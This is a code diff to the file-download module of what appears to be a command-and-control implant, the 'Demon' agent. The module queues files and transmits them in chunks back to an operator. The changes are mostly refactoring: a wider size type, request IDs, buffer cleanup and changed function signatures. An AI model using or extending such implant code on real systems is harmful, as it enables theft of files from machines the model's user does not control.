@@ -3,16 +3,17 @@
 #include <Core/MiniStd.h>
 
 /* Add file to linked list with type (upload/download) */
-PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, DWORD MaxSize )
+PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, LONGLONG MaxSize )
 {
     PDOWNLOAD_DATA Download = NULL;
 
-    Download           = NtHeapAlloc( sizeof( DOWNLOAD_DATA ) );
-    Download->FileID   = RandomNumber32();
-    Download->hFile    = hFile;
-    Download->Size     = MaxSize;
-    Download->State    = DOWNLOAD_STATE_RUNNING;
-    Download->Next     = Instance.Downloads;
+    Download            = NtHeapAlloc( sizeof( DOWNLOAD_DATA ) );
+    Download->FileID    = RandomNumber32();
+    Download->hFile     = hFile;
+    Download->Size      = MaxSize;
+    Download->State     = DOWNLOAD_STATE_RUNNING;
+    Download->Next      = Instance.Downloads;
+    Download->RequestID = Instance.CurrentRequestID;
 
     /* Push to linked list */
     Instance.Downloads = Download;
@@ -40,8 +41,9 @@ PDOWNLOAD_DATA DownloadGet( DWORD FileID )
 VOID DownloadFree( PDOWNLOAD_DATA Download )
 {
     /* close file handle. */
-    if ( Download->hFile )
-        Instance.Win32.NtClose( Download->hFile );
+    if ( Download->hFile ) {
+        SysNtClose( Download->hFile );
+    }
 
     PUTS( "Free download object" )
 
@@ -62,9 +64,9 @@ BOOL DownloadRemove( DWORD FileID )
 
     for ( ;; )
     {
-        if ( ! Download )
+        if ( ! Download ) {
             break;
-
+        }
 
         if ( Download->FileID == FileID )
         {
@@ -93,12 +95,23 @@ VOID DownloadPush()
 {
     PDOWNLOAD_DATA Download = NULL;
     PDOWNLOAD_DATA DownLast = NULL;
-    PPACKAGE        Package  = NULL;
+    PPACKAGE       Package  = NULL;
 
     Download = Instance.Downloads;
 
-    /* TODO: Check if we have some downloads
-     *       If not then free the chunk memory. */
+    /* do we actually have downloads pending? */
+    if ( ! Download )
+    {
+        /* we don't have any downloads, free the DownloadChunk if we have one */
+        if ( Instance.DownloadChunk.Buffer )
+        {
+            MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );
+            NtHeapFree( Instance.DownloadChunk.Buffer );
+            Instance.DownloadChunk.Buffer = NULL;
+        }
+
+        return;
+    }
 
     /* process current running downloads () */
     for ( ;; )
@@ -137,7 +150,7 @@ VOID DownloadPush()
             {
                 PUTS( "Send download chunk" )
 
-                Package = PackageCreateWithRequestID( Download->RequestID, DEMON_COMMAND_FS );
+                Package = PackageCreateWithRequestID( DEMON_COMMAND_FS, Download->RequestID );
 
                 /* Add Download header. */
                 PackageAddInt32( Package, 2 ); /* Download sub command */
@@ -149,13 +162,13 @@ VOID DownloadPush()
 
                 /* Send that chunk */
                 PUTS( "transmit download chunk" )
-                PackageTransmit( Package, NULL, NULL );
+                PackageTransmit( Package );
             }
 
             /* if this was the last chunk we read send a finish download close request */
             if ( ( Read > 0 ) && ( ! Download->Size ) )
             {
-                Package = PackageCreateWithRequestID( Download->RequestID, DEMON_COMMAND_FS );
+                Package = PackageCreateWithRequestID( DEMON_COMMAND_FS, Download->RequestID );
 
                 /* Add Download header. */
                 PackageAddInt32( Package, 2 ); /* Download sub command */
@@ -166,7 +179,7 @@ VOID DownloadPush()
                 PackageAddInt32( Package, DOWNLOAD_REASON_FINISHED );
 
                 /* Send that chunk */
-                PackageTransmit( Package, NULL, NULL );
+                PackageTransmit( Package );
             }
 
             /* if either what we read or the download size is 0 we are finished. */
